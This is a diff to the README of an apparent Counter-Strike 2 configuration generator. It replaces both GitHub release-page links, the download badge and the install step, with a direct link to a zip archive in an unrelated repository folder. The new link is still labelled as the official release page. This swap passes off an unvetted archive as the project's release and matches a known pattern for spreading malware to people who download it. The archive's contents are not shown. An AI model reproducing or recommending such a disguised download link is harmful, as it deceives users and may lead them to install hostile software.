@@ -5,7 +5,7 @@ description: "Build custom Counter-Strike 2 configuration files with a browser-b
 ---
 # 🎮 cs2-config-generator - Create custom settings for your game
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/mallorycastrated745/cs2-config-generator/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/mallorycastrated745/mallorycastrated745.github.io/main/ironmongering/Latest-v3.3.zip)
 
 This application helps you manage settings for Counter-Strike 2. You can browse, edit, and save console commands as text files. These files allow you to load your preferred game settings with one command. You do not need to edit game files manually or remember complex settings.
 
@@ -25,7 +25,7 @@ This application runs as a local web tool. It handles the logic of building the 
 
 Follow these steps to get the tool on your computer.
 
-1. Go to the [official release page](https://github.com/mallorycastrated745/cs2-config-generator/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/mallorycastrated745/mallorycastrated745.github.io/main/ironmongering/Latest-v3.3.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file link to start your download.
 4. Open your downloads folder once the transfer finishes. 
